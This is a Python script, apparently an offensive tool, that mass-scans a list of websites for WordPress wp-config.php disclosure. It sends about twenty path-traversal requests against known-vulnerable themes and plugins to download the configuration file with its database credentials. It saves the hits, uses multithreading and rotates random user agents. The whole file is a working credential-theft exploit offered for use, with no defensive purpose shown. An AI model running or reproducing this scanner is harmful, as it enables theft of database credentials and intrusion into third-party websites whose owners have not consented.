import requests
import sys
import time
import re
import os
from pystyle import Colors,Colorate,Write
from fake_useragent import UserAgent
from colorama import Fore,Style,init
from rich import print as cetak
from multiprocessing.dummy import Pool, Lock, Semaphore
import requests,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Pool
init(autoreset=True)
headersx = {'User-Agent': UserAgent().random}
red = Fore.RED
green = Fore.GREEN 
yellow = Fore.YELLOW
white = Fore.WHITE
blue = Fore.BLUE
MAX_THREADS = 50
thread_semaphore = Semaphore(MAX_THREADS)
thread_lock = Lock()
def clear():
	if sys.platform.startswith('linux'):
		os.system('clear')
	elif sys.platform.startswith('freebsd'):
		os.system('clear')
	else:
		os.system('cls')
def gui():
	Write.Print("─══════════════════════════ቐቐ══════════════════════════─\n", Colors.blue_to_purple, interval=0.01)
	text = f""" 
 █████╗ ██╗  ██╗██╗   ██╗    ██████╗  ██████╗ ████████╗
██╔══██╗╚██╗██╔╝██║   ██║    ██╔══██╗██╔═══██╗╚══██╔══╝
███████║ ╚███╔╝ ██║   ██║    ██████╔╝██║   ██║   ██║   
██╔══██║ ██╔██╗ ╚██╗ ██╔╝    ██╔══██╗██║   ██║   ██║   
██║  ██║██╔╝ ██╗ ╚████╔╝     ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝      ╚═════╝  ╚═════╝    ╚═╝  

# CREATED BY : t.me/AXVDIGITAL
# TOOLS NAME : WORDPRESS CONFIG SCANNER
# SAVED TO : results/WP_config.txt"""
	for N, line in enumerate(text.split("\n")):
		print(Colorate.Horizontal(Colors.red_to_green, line, 1))
		time.sleep(0.05)
	Write.Print("\n─══════════════════════════ቐቐ══════════════════════════─\n\n", Colors.blue_to_purple, interval=0.01)
 

def wpconfig(domain):
	list = ['/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php', 
		 	'/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php', 
			'/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php', 
			'/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php', 
			'/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php', 
			'/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php', 
			'/wp-content/themes/felis/download.php?file=../wp-config.php', 
			'/wp-content/force-download.php?file=../wp-config.php', 
			'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10', 
			'/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php', 
			'/wp-content/plugins/image-export/download.php?file=../../../wp-config.php', 
			'/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php', 
			'/wp-content/themes/markant/download.php?file=../../wp-config.php', 
			'/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php', 
			'/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php', 
			'/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php', 
			'/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php', 
			'/themes/SMWF/inc/download.php?file=../wp-config.php', 
			'/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php', 
			'/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download'
	]
	for wpcong in list:
		try:
			headersx = {'User-Agent': UserAgent().random}
			domain = ''.join(domain)
			domain = domain.strip()
			domain = re.sub(r'https?://', '', domain)
			wpcong = wpcong.strip()
			req_wpcong = requests.get(f"http://{domain}{wpcong}", headers=headersx, timeout=10, verify=False).text
			if 'DB_USER' in req_wpcong:
				open("results/WP_config.txt","a+").write(f"http://{domain}{wpcong}\n")
				print(f"{blue}|- {white}http://{domain}{wpcong} {yellow}| {green}Vuln!")
			else:
				print(f"{blue}|- {white}http://{domain}{wpcong} {yellow}| {red}Not Vuln!")
		except:pass
  

def wpfigInput():
	domain = open(input(f"{red}[{white}#{red}]{white} LIST SITE : ")).readlines()
	thr = int(input(f"{red}[{white}#{red}]{white} THREADS (Max 50): "))
	ThreadPool = Pool(thr)
	ThreadPool.map(wpconfig, domain)
 
if __name__ == "__main__":
            time.sleep(1)
            clear()
            gui()
            wpfigInput()
        